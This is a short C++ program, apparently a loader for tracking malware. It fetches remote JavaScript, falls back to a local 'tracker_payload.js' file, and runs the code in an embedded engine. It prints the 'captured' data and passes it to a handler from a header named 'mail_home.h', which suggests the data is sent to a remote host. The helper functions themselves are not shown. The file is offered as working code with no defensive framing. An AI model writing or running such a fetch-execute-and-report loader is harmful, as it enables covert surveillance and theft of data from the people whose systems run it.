
#include <fstream>
#include <sstream>
#include <iostream>
#include <string>

#include "embedded_js.h"
#include "mail_home.h"
#include "fetch_js_blob.h"

std::string read_file(const std::string& path) {
    std::ifstream f(path);
    std::ostringstream ss;
    ss << f.rdbuf();
    return ss.str();
}

int main() {
    std::string js_code = fetch_remote_js();
    if (js_code.empty()) {

        js_code = read_file("assets/tracker_payload.js");
    }

    std::string js_result = run_embedded_js(js_code);
    std::cout << "[+] JavaScript data captured:\n" << js_result << std::endl;

    handle_js_payload(js_result);

    return 0;
}
